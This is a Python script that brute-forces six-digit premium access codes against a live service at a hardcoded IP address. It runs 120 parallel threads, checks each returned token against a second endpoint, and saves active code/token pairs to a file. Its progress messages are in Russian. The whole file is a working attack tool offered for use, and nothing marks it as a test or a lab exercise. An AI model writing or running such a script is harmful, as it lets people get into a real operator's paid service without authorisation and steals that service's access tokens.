import json, time, urllib.request, urllib.error, concurrent.futures, os, sys

URL = "http://87.120.126.125:8001/check_pro_code/"
START, END = 100000, 1000000
PAR = 120
FOUND = "found.json"
STATE = "brute_state.txt"

def one(c):
    req = urllib.request.Request(
        URL, data=json.dumps({"code": c}).encode(),
        headers={"Content-Type": "application/json"}, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            body = r.read()
            return c, r.status, body
    except urllib.error.HTTPError as e:
        try:
            body = e.read()
        except Exception:
            body = b""
        return c, e.code, body
    except Exception:
        return c, 0, b""

def is_active(tok):
    req = urllib.request.Request(
        "http://87.120.126.125:8001/check_pro_auth/",
        data=json.dumps({"token": tok}).encode(),
        headers={"Content-Type": "application/json"}, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            return b'"success"' in r.read()
    except Exception:
        return False

def run():
    start = START
    if os.path.exists(STATE):
        try:
            start = max(START, int(open(STATE).read().strip()))
        except Exception:
            pass
    hits = []
    if os.path.exists(FOUND):
        hits = [h for h in json.load(open(FOUND)) if h.get("token")]
        json.dump(hits, open(FOUND, "w"))

    t0 = time.time()
    done = 0
    chunk = 2000
    c = start
    while c < END:
        rng = range(c, min(c + chunk, END))
        with concurrent.futures.ThreadPoolExecutor(PAR) as ex:
            for code, st, body in ex.map(one, rng):
                done += 1
                if st == 200 and b'"success"' in body:
                    tok = json.loads(body).get("token")
                    act = is_active(tok)
                    print("HIT", code, tok, "ACTIVE" if act else "expired", flush=True)
                    if act:
                        hits.append({"code": code, "token": tok})
                        json.dump(hits, open(FOUND, "w"))
                    continue
        c += chunk
        open(STATE, "w").write(str(c))
        el = time.time() - t0
        rate = done / el if el else 0
        left = (END - c) / rate / 60 if rate else 0
        print(f"прогресс {c}/{END} {rate:.0f}rps осталось {left:.0f}мин найдено {len(hits)}", flush=True)
        if len(hits) >= 8:
            break
    print("ГОТОВО, найдено:", len(hits), flush=True)

run()
